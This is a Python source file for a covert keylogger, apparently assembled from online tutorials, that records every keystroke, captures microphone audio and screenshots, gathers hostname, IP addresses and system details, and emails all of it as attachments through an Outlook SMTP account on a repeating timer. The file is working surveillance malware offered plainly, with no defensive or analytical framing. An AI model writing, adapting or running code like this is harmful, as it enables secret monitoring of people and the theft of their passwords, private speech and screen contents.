# code :
# https://www.codeitbro.com/how-to-create-keylogger-in-python/
# https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/

import os
import time
# keyboard input
from pynput.keyboard import Key, Listener
# log
import logging
# audio input
from scipy.io.wavfile import write
import sounddevice as sd
# screenshot
from PIL import ImageGrab
# system information
import socket
import platform
# email
import login
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib



# where to save the files
log_dir = os.path.dirname(os.path.abspath(__file__))

# the log file
keylog = "keylog.txt"

# disposable email created only for this project
mail = login.mail
pswd = login.pswd

# name of audio file
audio = "audio.wav"

# for how long we want to record the microphone (in seconds)
mic_time = 15

#default audio parameters
freq = 44100
sd.default.samplerate = freq
sd.default.channels = 2

# name of screenshot
screen = "screenshot.png"

iterations = 0
timeIteration = 30
nbIterations = 3
currentTime = time.time()
stopTime = time.time() + timeIteration



# save at least info level logs in a file called keylog.txt with the date, time and level
# logging.basicConfig(filename = (log_dir + keylog), level=logging.INFO, format='%(asctime)s: %(levelname)s: %(message)s')
logging.basicConfig(level=logging.INFO)
# create a file handler
file_handler = logging.FileHandler(keylog)
# file_handler.setLevel(logging.WARNING)
# message format
formatter = logging.Formatter('%(asctime)s: %(levelname)s: %(message)s')
file_handler.setFormatter(formatter)
logging.getLogger('').addHandler(file_handler)


# send the log file as an attachment in an email
def send_mail(filename, attachment, sendto):
    # create a message which can contain attachments of different types
    msg = MIMEMultipart()
    msg['From'] = mail
    msg['To'] = sendto
    msg['Subject'] = "Totally legal secret keylogger"
    body = "Don't show this to anyone. Nothing's suspicious here but still don't show this to anyone."
    
    # add the body to the message
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(attachment, "rb")

    base = MIMEBase('application', 'octet-stream')

    # encode the attachment in base64 (payload = content of the email)
    base.set_payload((attachment).read())
    encoders.encode_base64(base)

    # add a header to the message
    base.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(base)

    # create a SMTP session (smtp_server, smtp_port)
    session = smtplib.SMTP('smtp-mail.outlook.com', 587)

    # start TLS session for security
    session.starttls()

    # login
    session.login(mail, pswd)

    # convert the message to a string
    textmsg = msg.as_string()

    # send the email
    session.sendmail(mail, sendto, textmsg)

    # terminate the session
    session.quit()

send_mail(keylog, (log_dir + "/" + keylog), mail)


# get information about the system
def pc_infos():
        # get the hostname
        hostname = socket.gethostname()
        logging.info("Hostname: " + hostname)

        #get the private IP address
        ipaddr = socket.gethostbyname(hostname)
        logging.info("Private IP address: " + ipaddr)

        # get the public IP address
        try:
            public_ip = get("https://api.ipify.org").text # https://www.ipify.org/
            logging.info("Public IP address: " + public_ip)
        except Exception:
            logging.error("Couldn't get Public IP address, sad")

        # get the system and version
        logging.info("System: " + platform.system() + " " + platform.version())

        # get the machine type
        logging.info("Machine: " + platform.machine())

pc_infos()


# get microphone input
def record():
    duration = mic_time
    recording = sd.rec(int(duration * freq))
    sd.wait()
    write(log_dir + "/" + audio, freq, recording)

record()
send_mail(audio, log_dir + "/" + audio, mail)

# get screenshot
def screenshot():
    image = ImageGrab.grab()
    image.save(log_dir + "/" + screen)

screenshot()
send_mail(screen, log_dir + "/" + screen, mail)



# timer
while iterations < nbIterations:

    # save the key pressed as an info level log
    def pressed(key):
        global currentTime
        print(key)
        logging.info(str(key))
        currentTime = time.time()

    def stop(key):
        if key == Key.esc or currentTime > stopTime:
            return False

    # create a listener
    with Listener(on_press=pressed, on_release=stop) as listener:
        listener.join()

    if currentTime > stopTime:
        logging.info("********************************")
        screenshot()
        send_mail(screen, log_dir + "/" + screen, mail)
        send_mail(keylog, log_dir + "/" + keylog, mail)
        nbIterations+=1
        currentTime = time.time()
        stopTime = time.time() + timeIteration

